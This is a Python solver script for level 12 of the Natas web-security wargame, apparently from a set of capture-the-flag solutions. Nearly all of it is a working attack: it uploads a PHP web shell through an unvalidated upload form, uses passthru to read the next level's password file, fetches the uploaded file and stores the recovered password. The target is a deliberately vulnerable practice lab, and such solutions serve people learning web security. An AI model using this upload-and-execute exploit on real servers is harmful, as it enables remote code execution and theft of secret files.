"""
natas12: file upload without validation
"""

import re
import requests
from bs4 import BeautifulSoup
from typing import Optional

from natas_utils import *

LEVEL = 12

def solve(url: str, login: LevelLogin) -> Optional[str]:
    # The form allows file upload, but there's no file validation.
    # Send PHP and see if the server will run it.
    data = {
        "filename": "pwn.php",
    }
    payload = {
        "uploadedfile": f"<? passthru('cat {NATAS_DATA['flag_path']}natas{LEVEL}'); ?>",
    }
    response = requests.post(url, auth=login, data=data, files=payload)
    response.raise_for_status()

    page_content = BeautifulSoup(response.text, "html.parser").find("div", attrs={"id": "content"})
    uploaded_payload_path = page_content.find("a", attrs={"href": re.compile(r'.php$')}).get("href")

    response = requests.get(f"{url}/{uploaded_payload_path}", auth=login)

    # the flag _should_ be the only text in the response, but test it to be sure
    return try_level_login(LEVEL, extract_candidate_passwords(response.text, in_html_body=False))

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    natas13_password = solve(url, login)

    if natas13_password:
        print("natas12:", natas13_password)
        store_level_password(LEVEL + 1, natas13_password)
    else:
        exit("Failed to get password for the next level.")